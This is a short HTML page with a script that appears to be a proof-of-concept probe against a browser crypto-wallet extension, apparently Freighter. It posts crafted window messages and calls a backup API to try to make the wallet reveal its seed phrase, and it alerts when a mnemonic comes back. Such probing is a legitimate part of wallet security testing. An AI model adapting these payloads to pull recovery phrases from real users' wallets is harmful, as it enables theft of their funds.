<button id="btn">TRY TRIGGER BACKUP DISPLAY</button>
<script>
const payloads=[
  {type:"SHOW_SECRET"},
  {type:"SHOW_SECRET", request:{type:"SHOW_SECRET"}},
  {method:"showBackup", type:"UI"},
  {request:{type:"SHOW_MNEMONIC"}},
  {id:1, type:"openBackupPhrase"},
  {jsonrpc:"2.0", method:"showBackupPhrase"},
];
document.getElementById('btn').onclick=()=>{
  payloads.forEach(p=> window.postMessage(p,"*"));
  if(window.freighterApi && window.freighterApi.showBackup)
    window.freighterApi.showBackup();
};
window.addEventListener('message',(e)=>{
  if(JSON.stringify(e.data).toLowerCase().includes('mnemonic'))
    alert('SEED LEAK FOUND!');
});
</script>
